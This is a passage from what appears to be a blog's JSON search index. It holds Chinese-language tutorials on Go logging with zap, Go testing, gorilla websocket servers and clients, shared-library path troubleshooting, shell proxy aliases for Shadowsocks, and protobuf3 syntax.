time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tsugar.Infow(\"this is a dummy log\", \"Dummy\", dummyData())\n\t}\n\ty += time.Since(t).Nanoseconds()\n\n\t// stdlog\n\tvar z int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tdummyStr, _ := json.Marshal(dummyData())\n\t\tlog.Printf(\"this is a dummy log: %s\\n\", string(dummyStr))\n\t}\n\tz += time.Since(t).Nanoseconds()\n\n\t// glog\n\tvar w int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tglog.Info(\"\\nthis is a dummy log: \", dummyData())\n\t}\n\tw += time.Since(t).Nanoseconds()\n\n\t// print\n\tfmt.Println(\"=====================\")\n\tfmt.Printf(\"Logrus: %5d ns per request \\n\", x/10000)\n\tfmt.Printf(\"Zap:    %5d ns per request \\n\", y/10000)\n\tfmt.Printf(\"StdLog: %5d ns per request \\n\", z/10000)\n\tfmt.Printf(\"Glog:   %5d ns per request \\n\", w/10000)\n}\n\n\n/*\n=====================\nLogrus: 19305 ns per request\nZap:     1095 ns per request\nStdLog:  7137 ns per request\nGlog:   12070 ns per request\n*/\n```\n\n\n\n### 2. zap 使用\n\n+ sugar模式 (牺牲性能为代价,增强可用性)\n\n```go\nfunc main() {\n\tlogger, _ := zap.NewProduction()\n\tdefer logger.Sync()\n\n\turl := \"https://www.liuvv.com\"\n\tsugar := logger.Sugar()\n\tsugar.Infow(\"failed to fetch URL\",\n\t\t\"url\", url,\n\t\t\"attempt\", 3,\n\t\t\"backoff\", time.Second,\n\t)\n\n\tsugar.Infof(\"Failed to fetch URL: %s\", url)\n}\n\n\n// 注意 infow 和 infof 的调用区别\n\n/*\n{\"level\":\"info\",\"ts\":1566623998.1506088,\"caller\":\"log/main.go:15\",\"msg\":\"failed to fetch URL\",\"url\":\"https://www.liuvv.com\",\"attempt\":3,\"backoff\":1}\n \n{\"level\":\"info\",\"ts\":1566623998.15073,\"caller\":\"log/main.go:20\",\"msg\":\"Failed to fetch URL: https://www.liuvv.com\"}\n*/\n```\n\n+ logger 模式\n\n```go\nfunc main() {\n\tlogger, _ := zap.NewProduction()\n\tdefer logger.Sync()\n\n\turl := \"https://www.liuvv.com\"\n\tlogger.Info(\"failed to fetch URL\",\n\t\tzap.String(\"url\", url),\n\t\tzap.Int(\"attempt\", 3),\n\t\tzap.Duration(\"backoff\", time.Second),\n\t)\n\n\t//logger.Infow() //没有此函数\n\t//logger.Infof() //没有此函数\n}\n\n\n/*\n{\"level\":\"info\",\"ts\":1566624270.4984472,\"caller\":\"log/main.go:14\",\"msg\":\"failed to fetch URL\",\"url\":\"https://www.liuvv.com\",\"attempt\":3,\"backoff\":1}\n*/\n```\n\n\n\n##### 2.1 zap序列化输出\n\n```\nzap.NewDevelopment() //格式化输出\nzap.NewProduction() //json序列化输出\n```\n\n\n\n##### 2.2 输出到文件里\n\n```go\nfunc NewLogger() (*zap.Logger, error) {\n  cfg := zap.NewProductionConfig()\n  cfg.OutputPaths = []string{\n    \"/var/log/myproject/myproject.log\",\n  }\n  return cfg.Build()\n}\n```\n\n\n\n##### 2.3 输入到滚动文件里\n\nLumberjack用于将日志写入滚动文件。zap 不支持文件归档，如果要支持文件按大小或者时间归档，需要使用lumberjack，lumberjack也是zap官方推荐的。https://github.com/natefinch/lumberjack\n\n```go\nfunc main() {\n\t// lumberjack.Logger is already safe for concurrent use, so we don't need to\n\t// lock it.\n\thook := &lumberjack.Logger{\n\t\tFilename:   \"/tmp/foo.log\", // 日志文件路径\n\t\tMaxSize:    500,            // 每个日志文件保存的最大尺寸 单位：M\n\t\tMaxBackups: 3,              // 日志文件最多保存多少个备份\n\t\tMaxAge:     28,             // 文件最多保存多少天\n\t\tCompress:   true,           // 是否压缩\n\t}\n\tcore := zapcore.NewCore(\n\t\tzapcore.NewJSONEncoder(zap.NewProductionEncoderConfig()),                       // 编码器配置\n\t\tzapcore.NewMultiWriteSyncer(zapcore.AddSync(os.Stdout), zapcore.AddSync(hook)), // 打印到控制台和文件\n\t\tzap.InfoLevel, // 日志级别\n\t)\n\n\tlogger := zap.New(core)\n\tlogger.Info(\"failed to fetch URL\",\n\t\tzap.String(\"url\", \"https://www.liuvv.com\"),\n\t\tzap.Int(\"attempt\", 3),\n\t\tzap.Duration(\"backoff\", time.Second),\n\t)\n}\n```\n\n\n\n### 3. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/41991119","tags":["golang"],"categories":["golang"]},{"title":"golang编写测试用例","url":"%2Fp%2F269bf134.html","content":"\n\n\n### 1. Learn Go with tests\n\n当学习一门语言时, 最有效的办法不是每一章的去阅读概念, 而是通过例子探索学习.\n\n如果没有学习过 Go 语言的, 强烈建议通过编写测试学习 Go 语言, 不仅为测试驱动开发打下基础, 还是可以使用 Go 语言编写健壮的、经过良好测试的系统.\n\n强烈推荐: https://github.com/quii/learn-go-with-tests\n\n<!-- more -->\n\n\n\n### 2. Golang Test\n\nGo语言中自带有一个轻量级的测试框架`testing`和自带的`go test`命令来实现单元测试和性能测试，`testing`框架和其他语言中的测试框架类似，你可以基于这个框架写针对相应函数的测试用例，也可以基于该框架写相应的压力测试用例。测试用例有四种形式： \n\n+ TestXxxx(t *testing.T) // 单元测试\n+ TestBenchmarkXxxx(b* testing.B) // 压力测试\n+ Example_Xxx() // 测试控制台输出的例子 \n+ TestMain(m *testing.M) // 测试Main函数\n\n当然我们也可以使用第三方的测试框架, 更加高效的测试我们的代码:\n\nhttps://github.com/stretchr/testify\n\n\n\n###  3. 单元测试\n\n\n+ 需要创建一个名称以 _test.go 结尾的文件，该文件包含 `TestXxx` 函数\n+ `func TestXxx(*testing.T)`   // Xxx 可以是任何字母数字字符串，但是第一个字母不能是小些字母。\n+ 单元测试中，传递给测试函数的参数是 `*testing.T` 类型。\n\n\n\n##### 3.1 单元测试方法\n\n+ 当我们遇到一个断言错误的时候，标识这个测试失败，会使用到：\n\n  ```\n  Fail: 测试失败，测试继续，也就是之后的代码依然会执行\n  FailNow: 测试失败，测试中断\n  ```\n\n+ 当我们只希望打印信息，会用到:\n\n  ```\n  Log: 输出信息\n  Logf: 输出格式化的信息\n  ```\n\n+ 当我们断言失败的时候，不希望标识测试失败，会用到：\n\n  ```\n  Skip: 相当于 Log + SkipNow\n  Skipf: 相当于 Logf + SkipNow\n  SkipNow: 跳过测试，测试中断\n  ```\n\n+ 当我们断言失败的时候，希望标识测试失败，但是测试继续，会用到：\n\n  ```\n  Error: 相当于 Log + Fail\n  Errorf: 相当于 Logf + Fail\n  ```\n\n+ 当我们断言失败的时候，希望标识测试失败，但中断测试，会用到\n\n  ```\n  Fatal: 相当于 Log + FailNow\n  Fatalf: 相当于 Logf + FailNow\n  ```\n\n  \n\n### 4.  压力测试\n\n+ func BenchmarkXxx(*testing.B)  //函数形式\n+ 通过 \"go test\" 命令，加上 `-bench` flag 来执行\n\n```go\nfunc BenchmarkIsPalindrome(b *testing.B) {\n\tfor i := 0; i < b.N; i++ {\n\t\tIsPalindrome(\"A man, a plan, a canal: Panama\")\n\t}\n}\n\n$ go test -bench=.\nPASS\nBenchmarkIsPalindrome-8 1000000                1035 ns/op\nok      gopl.io/ch11/word2      2.179s\n```\n\n结果中基准测试名的数字后缀部分，这里是8，表示运行时对应的GOMAXPROCS的值。\n\n报告显示每次调用IsPalindrome函数花费1.035微秒，是执行1,000,000次的平均时间。\n\n因为基准测试驱动器开始时并不知道每个基准测试函数运行所花的时间，它会尝试在真正运行基准测试前先尝试用较小的N运行测试来估算基准测试函数所需要的时间，然后推断一个较大的时间保证稳定的测量结果。\n\n\n\n### 5. 常用测试用法\n\n##### 5.1 测试单个文件和单个方法\n\n+ 测试单个文件 go test -v  file_test.go\n\n+ 测试单个函数：go test -v file_test.go -test.run TestFunc\n\n##### 5.2 测试goroutine 是否竞争\n\n```\ngo test -race\n```\n\n##### 5. 3 TestMain函数\n\n在测试之前或之后进行额外的设置（setup）或拆卸（teardown), 测试进入的第一个函数\n\n```\nfunc TestMain(m *testing.M)\n```\n\n##### 5.4 测试覆盖率\n\n```\ngo tool cover -html=c.out\n```\n\n\n\n### 6. 参考资料\n\n+ https://github.com/quii/learn-go-with-tests  //非常重要\n+ https://github.com/stretchr/testify\n\n+ https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter09/09.0.html\n\n+ https://studygolang.com/articles/12587\n\n","tags":["golang"],"categories":["golang"]},{"title":"golang的websocket的使用","url":"%2Fp%2Ffae4c74c.html","content":"\n\n\n### 1. 前言\n\n有些场景下，比如交易 K 线，我们需要前端对后端进行轮询来不断获取或者更新资源状态。轮询的问题毫无以为是一种笨重的方式，因为每一次 http 请求除了本身的资源信息传输外还有三次握手以及四次挥手。替代轮询的一种方案是复用一个 http 连接，更准确的复用同一个 tcp 连接。这种方式可以是 http 长连接，也可以是 websocket。\n\n<!-- more -->\n\n##### 1.1. http长连接\n\nhttp 其实不存在长短连接, http协议的长连接和短连接，实质上是tcp协议的长连接和短连接。\n\nhttp会话永远都是：请求响应结束，这里长连接指一次tcp连接可以传递多次的HTTP报文信息。\n\n##### 1.2 websocket\n\nwebsocket协议是基于tcp的一种新的网络协议。它实现了浏览器与服务器全双工(full-duplex)通信——允许服务器主动发送信息给客户端。\nwebsocket通信协议于2011年被IETF定为标准RFC 6455，并被RFC7936所补充规范。\n\n##### 1.3 websocket 和 http 长连接的区别\n\n首先 websocket 和 http 是完全不同的两种协议，虽然底层都是 tcp/ip。http 长连接也是属于 http 协议。\n\nhttp 协议和 websocket 的最大区别就是 http 是基于 request/response 模式，而 websocket 的 client 和 server 端却可以随意发起 data push。\n\n##### 1.4 sse(server-sent events)\n\nsse是 websockct 的一种轻量代替方案，使用 http 协议。sse 规范是 html5 规范的一个组成部分。\n\n严格地说，http无法做到服务器主动推送信息。但是，有一种变通方法，就是服务器向客户端声明，接下来要发送的是流信息（Content-Type: text/event-stream）。\n\n总体来说，websocket 更强大和灵活。因为它是全双工通道，可以双向通信；sse 是单向通道，只能服务器向浏览器发送，因为流信息本质上就是下载。如果浏览器向服务器发送信息，就变成了另一次 http 请求。\n\n\n\n### 2. golang websocket\n\n在golang语言中，目前有两种比较常用的实现方式：一个是golang自带的库，另一个是[gorilla](github.com/gorilla/websocket)，后者功能更加强大。\n\n\n\n##### 2.1 server端\n\n下面server端是一个http 服务器，监听8080端口。当接收到连接请求后，将连接使用的http协议升级为websocket协议。后续通信过程中，使用websocket进行通信。\n\n对每个连接，server端等待读取数据，读到数据后，打印数据，然后，将数据又发送给client\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar addr = flag.String(\"addr\", \"localhost:8080\", \"http service address\")\n\nvar upgrader = websocket.Upgrader{} // use default options\n\nfunc echo(w http.ResponseWriter, r *http.Request) {\n\tc, err := upgrader.Upgrade(w, r, nil)\n\tif err != nil {\n\t\tlog.Print(\"upgrade:\", err)\n\t\treturn\n\t}\n\tdefer c.Close()\n\tfor {\n\t\tmt, message, err := c.ReadMessage()\n\t\tif err != nil {\n\t\t\tlog.Println(\"read:\", err)\n\t\t\tbreak\n\t\t}\n\t\tlog.Printf(\"server recv: %s\", message)\n\t\terr = c.WriteMessage(mt, message)\n\t\tif err != nil {\n\t\t\tlog.Println(\"write:\", err)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc main() {\n\tflag.Parse()\n\thttp.HandleFunc(\"/echo\", echo)\n\tlog.Fatal(http.ListenAndServe(*addr, nil))\n}\n```\n\n\n\n##### 2.2 client端\n\nclient启动后，首先连接server。连接建立后，主routine每一秒钟向server发送消息(当前时间)。另一个routine从server接收数据,并打印。\n\n当client退出时，会向server发送关闭消息。接着，等待退出。\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"log\"\n\t\"net/url\"\n\t\"os\"\n\t\"os/signal\"\n\t\"time\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar addr = flag.String(\"addr\", \"localhost:8080\", \"http service address\")\n\nfunc main() {\n\tflag.Parse()\n\tlog.SetFlags(0)\n\n\tinterrupt := make(chan os.Signal, 1)\n\tsignal.Notify(interrupt, os.Interrupt)\n\n\tu := url.URL{Scheme: \"ws\", Host: *addr, Path: \"/echo\"}\n\tlog.Printf(\"connecting to %s\", u.String())\n\n\tc, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n\tif err != nil {\n\t\tlog.Fatal(\"dial:\", err)\n\t}\n\tdefer c.Close()\n\n\tdone := make(chan struct{})\n\n\tgo func() {\n\t\tdefer close(done)\n\t\tfor {\n\t\t\t_, message, err := c.ReadMessage()\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"read:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tlog.Printf(\"client recv: %s\", message)\n\t\t}\n\t}()\n\n\tticker := time.NewTicker(time.Second)\n\tdefer ticker.Stop()\n\n\tfor {\n\t\tselect {\n\t\tcase <-done:\n\t\t\treturn\n\t\tcase t := <-ticker.C:\n\t\t\terr := c.WriteMessage(websocket.TextMessage, []byte(t.String()))\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"write:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\tcase <-interrupt:\n\t\t\tlog.Println(\"interrupt\")\n\n\t\t\t// Cleanly close the connection by sending a close message and then\n\t\t\t// waiting (with timeout) for the server to close the connection.\n\t\t\terr := c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, \"\"))\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"write close:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tselect {\n\t\t\tcase <-done:\n\t\t\tcase <-time.After(time.Second):\n\t\t\t}\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\n\n\n![1](golang_websocket/1.png)\n\n\n\n### 3. 总结\n\n##### 服务器:\n\n+ var upgrader = websocket.Upgrader{}\n+ c, err := upgrader.Upgrade(w, r, nil)\n+ for循环里 c.ReadMessage()  和 c.WriteMessage(mt, message)\n\n##### 客户端:\n\n+ c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n+ for循环里 c.ReadMessage()  和 c.WriteMessage(mt, message)\n\n\n\n### 4. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/35167916\n+ https://www.jianshu.com/p/3fc3646fad80","tags":["websocket"],"categories":["golang"]},{"title":"动态库查找路径及LD_LIBRARY_PATH问题","url":"%2Fp%2F17c0913d.html","content":"\n说到和动态库查找路径相关的问题，总体上可以分为两类：\n\n+ 第一类：通过源代码编译程序时出现的找不到某个依赖包的问题\n+ 第二类：就是在运行程序的时候，明明把那个程序需要的依赖包都已经安装的妥妥的了，可运行的时候人家就告诉你说`error while loading shared libraries: libxxx.so.y: cannot open shared object file: No such file or directory`。\n\n<!-- more -->\n\n###    1. 源代码安装程序找不到依赖库\n\n通过源码包安装程序时，主要用到了“三大步”策略：configure、make和make install 。出问题最多的就是在configure阶段，很多初学者由于不知道configure的那么多参数该怎么用，所以往往为了省事，一句简单的“./configure”下去，百分之八九十都能成功，可问题往往就出在剩下的百分之十几上面了。\n\n\n\n在安装的configure阶段，为了检测安装安装环境是否满足，通常情况下都是通过一个叫做`pkg-config`的工具来检测它需要依赖的动态库是否存在，这个工具我们在上一篇博文已经认识过了。pkg-config通常情况都是位于/usr/bin目录下，是个可执行程序。在configure阶段，通常都会用pkg-config来判断所依赖的动态库是否存在。现在问题就是，这个工具是如何判断的呢？它的依据是什么？当这两个问题弄明白了，真相也就大白了。\n\n\n\n 一般当我们安装完某个程序后，如果它提供了动态库的功能，在源码中都会有一个或多个以pc结尾的文件，当执行完make install后这些pc文件拷贝到${prefix}/lib/pkgconfig这个目录里，这里的prefix就是我们在configure阶段时通过配置参数--prefix指定的，缺省情况这个值就是/usr/local，所以这些pc文件最终会被拷贝到/usr/local/lib/pkgconfig目录下。可能有人会问，这些pc文件有啥用呢？我们随便打开一个来瞅瞅：\n\n```shell\n\n[root@localhost ~]# cat /usr/local/lib/pkgconfig/librtmp.pc\nprefix=/usr/local\nexec_prefix=${prefix}\nlibdir=${exec_prefix}/lib\nincdir=${prefix}/include\n\n\nName: librtmp\nDescription: RTMP implementation\nVersion: v2.3\nRequires: libssl,libcrypto\nURL: http://rtmpdump.mplayerhq.hu\nLibs: -L${libdir} -lrtmp -lz\nCflags: -I${incdir}\n```\n\n跟我们configure阶段相关的主要集中在Libs和Cflags两项上面，如果你此时再执行下面这两条命令，就全明白了：\n\n```shell\n[root@localhost ~]# pkg-config --cflags librtmp\n-I/usr/local/include\n[root@localhost ~]# pkg-config --libs librtmp\n-L/usr/local/lib -lrtmp -lz -lssl -lcrypto\n```\n\n也就是说，pkg-config把我们以前需要在Makefile里指定编译和链接时所需要用到的参数从手工硬编码的模式变成了自动完成，节约了多少跨平台移植的兼容性问题。\n\n\n\n##### 1.1 安装了找不到依赖库的原因\n\n假如说，如果我们将要的编译的软件包依赖librtmp这个动态库，那么此时在我系统上这个检测就算通过了。当然这只是第一步，检测过了不一定兼容，这里我们只讨论能不能找到依赖库的问题。好了，如果说找不到某个库该怎么办。前提是你确确实实已经安装了它需要的库，不用多想，原因只有一个，pkg-config找不到这个与这个库对应的pc文件。\n\n为什么会找不到呢，原因又有两点：\n\n1、pkg-config搜索了所有它认为合适的目录都没找着这个库对应的pc文件的下落；\n\n2、这个库在发布时根本就没有提供它的pc文件。\n\n> 那么pkg-config的查找路径是哪里？\n\npkg-config较老的版本里，缺省情况下会到/usr/lib/pkgconfig、/usr/loca/lib/pkgconfig、/usr/share/pkgconfig等目录下去搜索pc文件，据我所知在0.23以及之后的版本里pkg-config的源码里已经没有关于缺省搜索路径的任何硬编码的成分了，取而代之的是，当你看pkg-config的man手册时会有下面一段话：\n\n```\npkg-config retrieves information about packages from special metadata files. These files are  named  after the  package,  with  the extension .pc.\nBy default, pkg-config looks in the directory ___prefix___/lib/pkgconfig for these files; it will also look in the colon-separated (on Windows, semicolon-separated) list of directories specified by the PKG_CONFIG_PATH environment variable.\n\n\n\nPKG_CONFIG_PATH\n    A colon-separated (on Windows, semicolon-separated) list of directories to search  for  .pc  files. The  default directory will always be searched after searching the path; the default is ___libdir___/pkg-config:___datadir___/pkgconfig where libdir is the libdir where pkg-config and  datadir  is  the  datadir where pkg-config was installed.\n```\n\n\n\n  上面的prefix、libdir和datadir，就是安装pkg-config时被设定好的，具体情况是：\n\n+ 如果你是通过yum和rpm包安装的\n\n  ```bash\n  prefix=/usr\n  libdir=${prefix}/lib=/usr/lib\n  datadir=${prefix}/share=/usr/share\n  ```\n\n+ 如果你是通过源码包安装的，且没有指定prefix的值\n\n  ```bash\n  prefix=/usr/local\n  libdir=${prefix}/lib=/usr/local/lib\n  datadir=${prefix}/share=/usr/local/share \n  ```\n\n\n\npkg-config在查找对应软件包的信息时的缺省搜索路径已经很清楚了，就是是`${libdir}/pkgconfig`和`${datadir}/pkgconfig`。如果你软件包对应的pc文件都不在这两个目录下时，pkg-config肯定找不到。既然原因都已经找到了，那解决办法也就多种多样了。\n\n\n\n##### 1.2 解决找不到库的问题(PKG_CONFIG_PATH)\n\n+ 我们可以在安装我们那个被依赖的软件包时，在configure阶段用--prefix参数把安装目录指定到/usr目录下；\n\n+ 也可以按照上面说的，通过一个名叫`PKG_CONFIG_PATH`的环境变量来向pkg-config指明我们自己的pc文件所在的路径，不过要注意的是`PKG_CONFIG_PATH`所指定的路径优先级比较高，pkg-config会先进行搜索，完了之后才是去搜索缺省路径。\n\n前者的优点是以后再通过源码安装软件时少了不少麻烦，缺点是用户自己的软件包和系统软件混到一起不方便管理，所以实际使用中，后者用的要多一些。如下:\n\n```bash\nexport PKG_CONFIG_PATH=/your/local/path:$PKG_CONFIG_PATH\n```\n\n  然后，在configure时就绝对没问题了。\n\n\n\n### 2. 程序运行时出现libxxx.so.y => not found\n\n##### 2.1 ldd 查看依赖的动态库\n\n用`ldd 可执行程序名`可以查看一个软件启动时所依赖的动态库，如果输出项有“libxxx.so.y=> not found”一项，你这个软件100%运行不起来。我们来做个试验：\n\n```bash\n[root@localhost ~]# echo $LD_LIBRARY_PATH    //嘛也没有\n[root@localhost ~]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => /usr/local/lib/libmp3lame.so.0 (0x0088c000)\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x00573000)\n........\n```\n\n\n\n我的系统里没有设置`LD_LIBRARY_PATH`环境变量，现在我们把其中的一个库`libmp3lame.so.0`从`/usr/loca/lib`下移动到/opt目录里，并执行ldconfig，让`libmp3lame.so.0`彻底从`/etc/ld.so.cache`里面消失。其实`libmp3lame.so.0`只是`libmp3lame.so.0.0.0`的一个符号链接，我们真正需要移动的是后者.\n\n完了之后再执行ldd /usr/local/bin/ffmpeg时结果如下：\n\n```bash\n[root@localhost ~]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => not found    //果然Not found 了\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x004a4000)\n........\n\n[root@localhost ~]# ffmpeg --help\nffmpeg: error while loading shared libraries: libmp3lame.so.0: cannot open shared object file: No such file or directory  //此时ffmpeg当然运行不起来\n```\n\n   \n\n##### 2.2 LD_LIBRARY_PATH \n\n我们来试试LD_LIBRARY_PATH，看看好使不：\n\n```bash\n[root@localhost opt]# export LD_LIBRARY_PATH=/opt:$LD_LIBRARY_PATH\n[root@localhost opt]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => not found           //纳尼？？！！！\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x00124000)\n........\n```\n\n还记得上面提到了软链接么，`libmp3lame.so.0`就是`libmp3lame.so.0.0.0`的软链接，这是动态库的命名规范的一种公约，我们只要在/opt/目录下建立一个名为`libmp3lame.so.0`的到`/opt/libmp3lame.so.0.0.0`的软链接就OK了：\n\n```bash\n[root@localhost opt]# ln -s libmp3lame.so.0.0.0 libmp3lame.so.0\n[root@localhost opt]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => /opt/libmp3lame.so.0 (0x00767000)   //终于圆满了:)\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x006e8000)\n........\n```\n\n### 3. 总结\n\n针对动态库路径查找的种种问题，无非就这么两大类，关键是找对原因，对症下药，方能药到病除。\n\n+ PKG_CONFIG_PATH从字面意思上翻译，就是“软件包的配置路径”，这不很明显了么，编译软件时如果出现找不到所依赖的动态库时都全靠PKG_CONFIG_PATH了；\n+ LD_LIBRARY_PATH也很直白了“装载器的库路径”，LD是Loader的简写，在Linux系统启动一个程序的过程就叫做装载，一个程序要执行时它或多或少的会依赖一些动态库(静态编译的除外)。\n\n### 4. 参考资料\n\n+ http://blog.chinaunix.net/uid-23069658-id-4028681.html\n+ https://prefetch.net/articles/linkers.badldlibrary.html","tags":["linux"],"categories":["系统"]},{"title":"为iterm2设置shadowsocks代理","url":"%2Fp%2F937317d6.html","content":"\nshadowsocks是我们常用的代理工具，它使用socks5协议，而终端很多工具目前只支持http和https等协议，对socks5协议支持不够好，所以我们为终端设置shadowsocks的思路就是将socks协议转换成http协议，然后为终端设置即可。\n\n\n\n\n\n### 1. 设置终端代理\n\n最新的 [ShadowsocksX-NG](https://github.com/shadowsocks/ShadowsocksX-NG/releases/) 已经支持终端代理, 我们可以如下图复制得出:\n```bash\nexport http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;\n```\n<!-- more -->\n\n![1](为iterm2设置shadowsocks代理/1.png)\n\n\n\n为了方便, 我们可以制作一下别名\n\n```bash\nalias setproxy='export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;' # 设置终端代理\n\nalias disproxy='unset http_proxy https_proxy' # 取消终端代理\n\nalias ip='curl cip.cc' # 测试\n```\n\n另外我们可以通过`ShadowsocksX-NG` 的偏好设置看到以下相关配置.\n\n\n\n##### 1.1 http监听端口\n\n![1](为iterm2设置shadowsocks代理/2.png)\n\n\n\n##### 1.2 sockes5监听端口\n\n![1](为iterm2设置shadowsocks代理/3.png)\n\n\n\n### 参考资料:\n\n+ https://droidyue.com/blog/2016/04/04/set-shadowsocks-proxy-for-terminal/\n+ https://blog.naaln.com/2019/03/terminal-proxy/\n\n","tags":["linux"],"categories":["iterm2"]},{"title":"protobuf3语法指南","url":"%2Fp%2F21122343.html","content":"\n\nProtocol Buffer是Google的语言中立的，平台中立的，可扩展机制的，用于序列化结构化数据 - 对比XML，但更小，更快，更简单。您可以定义数据的结构化，然后可以使用特殊生成的源代码轻松地在各种数据流中使用各种语言编写和读取结构化数据。\n\n### 1. 定义消息类型\n\n先来看一个非常简单的例子。假设你想定义一个“搜索请求”的消息格式，每一个请求含有一个查询字符串、你感兴趣的查询结果所在的页数，以及每一页多少条查询结果。可以采用如下的方式来定义消息类型的.proto文件了：\n\n```protobuf\nsyntax = \"proto3\";\n\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n}\n```\n\n- 该文件的第一行指定您正在使用`proto3`语法：如果您不这样做，protobuf 编译器将假定您正在使用[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)。这必须是文件的第一个非空的非注释行。\n- 所述`SearchRequest`消息定义指定了三个字段（名称/值对），一个用于要在此类型的消息中包含的每个数据片段。每个字段都有一个名称和类型。\n\n<!-- more -->\n\n##### 1.1 指定字段类型\n\n在上面的示例中，所有字段都是[标量类型](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23scalar)：两个整数（`page_number`和`result_per_page`）和一个字符串（`query`）。但是，您还可以为字段指定合成类型，包括[枚举](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23enum)和其他消息类型。\n\n\n\n##### 1.2 分配标识号\n\n正如上述文件格式，在消息定义中，每个字段都有唯一的一个**数字标识符**。这些标识符是用来在消息的[二进制格式](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)中识别各个字段的，一旦开始使用就不能够再改变。注：[1,15]之内的标识号在编码的时候会占用一个字节。[16,2047]之内的标识号则占用2个字节。所以应该为那些频繁出现的消息元素保留 [1,15]之内的标识号。切记：要为将来有可能添加的、频繁出现的标识号预留一些标识号。\n\n最小的标识号可以从1开始，最大到2^29 - 1, or 536,870,911。不可以使用其中的[19000－19999]的标识号， Protobuf协议实现中对这些进行了预留。如果非要在.proto文件中使用这些预留标识号，编译时就会报警。\n\n\n\n##### 1.3 指定字段规则\n\n消息字段可以是以下之一：\n\n- 单数：格式良好的消息可以包含该字段中的零个或一个（但不超过一个）。\n- `repeated`：此字段可以在格式良好的消息中重复任意次数（包括零）。将保留重复值的顺序。在proto3中，`repeated`数字类型的字段默认使用`packed`编码。`packed`您可以在[协议缓冲区编码中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding.html%23packed)找到有关编码的更多信息。\n\n+ 限定修饰符包含 required\\optional\\repeated\n\n  + Required: 表示是一个必须字段，必须相对于发送方，在发送消息之前必须设置该字段的值，对于接收方，必须能够识别该字段的意思。发送之前没有设置required字段或者无法识别required字段都会引发编解码异常，导致消息被丢弃。\n\n  + Optional：表示是一个可选字段，可选对于发送方，在发送消息时，可以有选择性的设置或者不设置该字段的值。对于接收方，如果能够识别可选字段就进行相应的处理，如果无法识别，则忽略该字段，消息中的其它字段正常处理。---因为optional字段的特性，很多接口在升级版本中都把后来添加的字段都统一的设置为optional字段，这样老的版本无需升级程序也可以正常的与新的软件进行通信，只不过新的字段无法识别而已，因为并不是每个节点都需要新的功能，因此可以做到按需升级和平滑过渡。\n\n  + Repeated：表示该字段可以包含0~N个元素。其特性和optional一样，但是每一次可以包含多个值。可以看作是在传递一个数组的值。\n\n\n\n##### 1.4 添加更多消息类型\n\n可以在单个`.proto`文件中定义多种消息类型。如果要定义多个相关消息，这很有用  \n\n例如，如果要定义与`SearchResponse`消息类型对应的回复消息格式，可以将其添加到相同的消息`.proto`：\n\n```protobuf\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n}\n\nmessage SearchResponse {\n ...\n}\n```\n\n\n\n##### 1.5 添加注释\n\n要为`.proto`文件添加注释，请使用C / C ++ - 样式`//`和`/* ... */`语法。\n\n```protobuf\n/* SearchRequest表示搜索查询，带有分页选项\n *表明响应中包含哪些结果。*/\n\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2; //我们想要哪个页码？\n  int32 result_per_page = 3; //每页返回的结果数。\n}\n```\n\n\n\n##### 1.6 保留字段\n\n如果通过完全删除字段或将其注释来[更新](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23updating)消息类型，则未来用户可以在对类型进行自己的更新时重用字段编号。\n\n如果以后加载相同的旧版本，这可能会导致严重问题`.proto`，包括数据损坏，隐私错误等。确保不会发生这种情况的一种方法是指定已删除字段的字段编号（和/或名称，这也可能导致JSON序列化问题）`reserved`。如果将来的任何用户尝试使用这些字段标识符，协议缓冲编译器将会抱怨。\n\n```protobuf\nmessage Foo {\n  reserved 2, 15, 9 to 11;\n  reserved \"foo\", \"bar\";\n}\n```\n\n请注意，您不能在同一`reserved`语句中混合字段名称和字段编号。\n\n\n\n##### 1.7 